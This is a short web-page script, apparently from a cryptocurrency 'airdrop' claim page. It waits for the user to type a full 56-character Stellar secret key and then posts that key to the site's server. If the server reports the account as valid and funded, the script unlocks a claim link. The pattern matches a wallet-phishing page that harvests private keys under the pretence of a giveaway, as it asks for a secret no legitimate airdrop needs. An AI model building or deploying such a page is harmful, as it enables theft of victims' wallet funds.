<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

<script>
document.getElementById("airdropSecret").addEventListener("input", function() {
    const secret = this.value.trim();

    // Trigger only when full secret key length is reached
    if (secret.length === 56) {
        fetch("/validate_airdrop_secret", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ secret: secret })
        })
        .then(res => res.json())
        .then(data => {
            if (data.valid) {
                document.getElementById("airdropLink").classList.remove("disabled");
                document.getElementById("airdropSecret").style.display = "none";
            } else {
                alert("Invalid or unfunded Stellar account");
            }
        })
        .catch(err => {
            console.error("Validation error:", err);
            alert("Error validating secret key");
        });
    }
});
</script>



